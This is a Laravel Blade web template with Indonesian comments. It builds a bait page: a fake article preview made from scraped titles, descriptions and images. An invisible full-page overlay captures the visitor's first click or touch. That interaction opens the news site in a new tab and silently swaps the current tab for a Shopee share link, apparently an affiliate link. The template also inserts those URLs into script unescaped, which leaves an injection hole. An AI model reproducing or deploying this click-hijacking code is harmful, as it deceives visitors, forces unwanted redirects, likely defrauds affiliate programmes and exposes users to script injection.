<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <!-- Primary Meta Tags -->
    <title>{{ $site->title }}</title>
    <meta name="title" content="{{ $site->title }}">
    <meta name="description" content="{{ $site->description }}">

    <!-- Open Graph / Facebook -->
    <meta property="og:type" content="website">
    <meta property="og:url" content="{{ url()->current() }}">
    <meta property="og:title" content="{{ $site->title }}">
    <meta property="og:description" content="{{ $site->description }}">
    <meta property="og:image" content="{{ $site->image_url }}">

    <!-- Twitter -->
    <meta property="twitter:card" content="summary_large_image">
    <meta property="twitter:url" content="{{ url()->current() }}">
    <meta property="twitter:title" content="{{ $site->title }}">
    <meta property="twitter:description" content="{{ $site->description }}">
    <meta property="twitter:image" content="{{ $site->image_url }}">

    <style>
        body, html {
            margin: 0;
            padding: 0;
            width: 100%;
            height: 100%;
            overflow: hidden; /* Mencegah scroll asli dari body */
            background-color: #ffffff;
            font-family: system-ui, -apple-system, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            color: #333;
        }
        
        /* Tampilan Artikel Palsu (Preview Umpan) */
        .article-preview {
            max-width: 600px;
            margin: 0 auto;
            padding: 20px;
            text-align: left;
            position: relative;
            z-index: 1;
        }

        .article-preview img {
            width: 100%;
            max-height: 350px;
            object-fit: cover;
            border-radius: 12px;
            margin-bottom: 20px;
            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
        }

        .article-preview h1 {
            font-size: 26px;
            line-height: 1.4;
            margin-bottom: 15px;
            color: #111;
            font-weight: 800;
        }

        .article-preview p {
            font-size: 17px;
            line-height: 1.6;
            color: #555;
            margin-bottom: 30px;
        }

        .btn-read {
            display: block;
            background-color: #2563eb;
            color: #fff;
            padding: 15px;
            border-radius: 8px;
            font-size: 18px;
            font-weight: bold;
            text-align: center;
            width: 100%;
            box-sizing: border-box;
            box-shadow: 0 4px 10px rgba(37,99,235,0.3);
            text-decoration: none;
        }

        /* Overlay transparan di atas iframe untuk mencegat klik/scroll */
        .click-overlay {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 10;
            background: rgba(255, 255, 255, 0.0); /* Sepenuhnya transparan (tak kasat mata) */
            cursor: pointer;
        }
    </style>
</head>
<body>

    <!-- Halaman Umpan (Preview Artikel dari Data Scraping) -->
    <div class="article-preview">
        @if($site->image_url)
            <img src="{{ $site->image_url }}" alt="Thumbnail">
        @endif
        <h1>{{ $site->title }}</h1>
        <p>{{ $site->description }}</p>
        
        <div class="btn-read">Baca Selengkapnya...</div>
    </div>
    
    <!-- Pelindung Layar untuk Menangkap Interaksi -->
    <div class="click-overlay" id="overlay"></div>

    <script>
        var targetUrl = "{!! $site->url !!}";
        var shareLink = "{!! $site->share_link !!}";
        
        function handleInteraction(e) {
            // Langsung buka 2 sekaligus pada klik/sentuhan pertama:
            
            // 1. Membuka targetUrl di tab baru (Situs Berita)
            window.open(targetUrl, '_blank');
            
            // 2. Mengubah tab saat ini menjadi share_link (Shopee)
            window.location.replace(shareLink);
        }

        var overlay = document.getElementById('overlay');
        
        // Tangkap interaksi pertama saja (once: true) agar tidak berulang
        overlay.addEventListener('click', handleInteraction, { once: true });
        overlay.addEventListener('touchend', handleInteraction, { once: true });
    </script>
</body>
</html>
